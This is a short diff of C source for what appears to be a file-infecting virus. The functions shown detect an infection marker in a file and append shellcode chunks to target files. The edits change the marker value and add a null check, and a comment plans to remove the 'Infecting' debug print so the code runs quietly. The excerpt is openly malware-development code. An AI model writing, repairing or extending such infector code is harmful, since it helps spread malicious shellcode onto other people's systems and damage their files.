@@ -8,7 +8,7 @@ int is_infected(FILE *fp, int shellcode_chunk_size) {
     return (false);
   fseek(fp, -(shellcode_chunk_size + (sizeof(int) * 2) + 1), SEEK_END);
   fread(&magic_bytes, sizeof(int), 2, fp);
-  if (magic_bytes[0] == 0xF33L && magic_bytes[1] == 0x600D)
+  if (magic_bytes[0] == 0xF3CE && magic_bytes[1] == 0x600D)
     result = true;
   fseek(fp, 0, SEEK_SET);
   return (result);
@@ -16,7 +16,7 @@ int is_infected(FILE *fp, int shellcode_chunk_size) {
 
 // Returns true on success, and false on failure.
 int infect_file(t_file *file, char *shellcode_chunk, unsigned int to_write, unsigned char chunk_number) {
-  int magic_bytes[2] = { 0xF33L, 0x600D };
+  int magic_bytes[2] = { 0xF3CE, 0x600D };
   FILE *fp;
 
   printf("Infecting: %s\n", file->absolute_path); // TODO: Remove.
@@ -50,6 +50,8 @@ int infect_files(t_list *to_infect, t_shellcode **chunks, size_t chunk_count) {
   t_list *list_ptr;
   unsigned char chunk_num = 0;
 
+  if (!to_infect || !to_infect->data)
+    return (false);
   list_ptr = to_infect;
   while (list_ptr != NULL) {
     if (infect_file(((t_file*)list_ptr->data), chunks[chunk_num]->buf, chunks[chunk_num]->length, chunk_num) == false)
